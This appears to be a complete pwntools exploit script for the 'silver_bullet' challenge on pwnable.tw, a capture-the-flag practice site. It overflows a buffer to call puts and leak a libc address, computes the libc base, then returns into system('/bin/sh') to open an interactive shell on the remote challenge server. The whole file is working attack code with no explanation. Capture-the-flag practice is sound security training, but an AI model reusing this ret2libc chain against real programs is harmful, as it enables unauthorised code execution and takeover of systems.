from pwn import *
elf = context.binary = ELF("./silver_bullet")
libc = ELF("./libc_32.so.6")
r = elf.process()
r = remote("chall.pwnable.tw", 10103)

# gdb.attach(r, '''
#     b* main+197\n
#     b* create_bullet + 120\n
#     c
# ''')

def option1(payload):
    r.sendlineafter(b"Your choice :",str(1))
    r.sendafter(b"of bullet :", payload)

def option2(payload):
    r.sendlineafter(b"Your choice :",str(2))
    r.sendafter(b"of bullet :", payload)

def option3():
    r.sendlineafter(b"Your choice :", str(3))

payload = cyclic(24)
option1(payload)
option2(payload)
payload = b"a"*(55-48) + p32(elf.plt["puts"]) + p32(elf.sym["main"]) + p32(elf.got["puts"])
option2(payload)
option3()
option3()
r.recvuntil(b"Oh ! You win !!\n")
puts_leak = u32(r.recv(4))
libc.address = puts_leak - libc.sym["puts"]
log.success(f"LIBC base: {hex(libc.address)}")

system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
payload = cyclic(24)
option1(payload)
option2(payload)
payload = b"a"*(55-48) + p32(system) + p32(libc.sym["exit"]) + p32(binsh)
option2(payload)
option3()
option3()
r.interactive()